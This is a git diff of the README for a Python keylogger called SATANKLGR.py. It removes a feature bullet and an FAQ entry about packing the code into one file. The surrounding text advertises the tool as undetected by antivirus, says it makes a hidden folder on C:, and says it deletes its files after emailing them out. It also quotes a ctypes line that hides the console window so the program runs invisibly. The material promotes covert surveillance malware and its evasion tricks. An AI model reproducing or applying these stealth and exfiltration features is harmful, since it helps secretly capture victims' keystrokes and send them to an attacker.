@@ -64,7 +64,6 @@ and pyarmor.
 + Compatible with all versions of Windows including Windows 10
 + Getting obfuscated .exe file to defend your data from disassembling
 + Fast fixing code if you have any problems
-+ Working exclusively with one file, no compounds, no problems
 + Not detected by antiviruses
 + Making hidden foulder in C:\ disk
 + Authomatical removing files after sending to email
@@ -80,10 +79,6 @@ _Is it legal?_
 
 _Why does the file `SATANKLGR.py` have exactly .py extension, not .pyw?_  
 > It was done, because currently `pyarmor` module does not support .pyw extension. It order to compensate this issue, I added this line of code `ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )` to compel the app to work invisibly  
-<br/>  
-
-_Why did you add all in one file and did not build dependencies, so your code become less_?  
-> As a matter of facts, I was thinking about it for a long time, but I have reached the definitive decision to gather them all in one file, so as to avoid possible further problems. What do I mean? For example, user can rename files with source code or move then to anouther foulder and finally application will not work.  
 <br/>  
 
 _Where can I find the source code_?  
